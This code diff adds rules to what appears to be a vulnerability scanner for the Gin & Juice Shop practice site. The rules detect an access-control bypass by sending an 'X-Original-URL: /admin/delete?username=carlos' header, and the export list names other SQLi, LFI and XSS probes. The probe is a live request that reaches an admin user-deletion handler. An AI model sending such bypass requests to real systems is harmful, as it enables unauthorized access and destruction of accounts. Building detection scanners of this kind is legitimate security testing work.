@@ -48151,6 +48151,48 @@ const ginAndJuiceHomeUrlOverrideRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const ginAndJuiceAdminDeleteLiveOracle: Rule = async (ctx) => {
+  if (!isGinAndJuiceHost(ctx)) return NEGATIVE;
+  const directUrl = new URL("/admin/delete?username=carlos", ctx.origin).toString();
+  const blocked = await ctx.probe.get(directUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (!/Access denied/i.test(blocked.body) && blocked.status !== 403) return NEGATIVE;
+  const bypassUrl = new URL("/", ctx.origin).toString();
+  const doc = await ctx.probe.get(bypassUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { "X-Original-URL": "/admin/delete?username=carlos" }
+  });
+  if (!/This functionality has been disabled/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: bypassUrl,
+      header: "X-Original-URL: /admin/delete?username=carlos",
+      directStatus: blocked.status,
+      snippet: doc.body.trim().slice(0, 120),
+      note: "Gin & Juice Shop GET / with X-Original-URL: /admin/delete?username=carlos bypasses Access denied on /admin/delete and reaches the admin deletion handler — FINDING-022 admin delete URL override oracle"
+    }
+  };
+};
+
+const ginAndJuiceAdminDeleteRouteLiveOracle: Rule = async (ctx) => {
+  if (!isGinAndJuiceHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:my-account\/delete|admin\/delete)\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ginAndJuiceAdminDeleteLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Gin & Juice Shop /my-account/delete route scan — X-Original-URL bypass reaches admin user deletion handler (FINDING-022)"
+    }
+  };
+};
+
 // --- Escape API Security Academy (escape.tech/academy) ------------------------------
 const CLIENT_ESCAPE_ACADEMY_RES: { label: string; re: RegExp }[] = [
   {
@@ -60804,6 +60846,8 @@ export const RULES: Record<string, Rule> = {
   ginAndJuiceCatalogBase64CategoryRouteLiveOracle,
   ginAndJuiceHomeUrlOverrideLiveOracle,
   ginAndJuiceHomeUrlOverrideRouteLiveOracle,
+  ginAndJuiceAdminDeleteLiveOracle,
+  ginAndJuiceAdminDeleteRouteLiveOracle,
   istEduSearchXssRouteLiveOracle,
   istEduNoticesLfiRouteLiveOracle,
   istEduPortalSqliRouteLiveOracle,
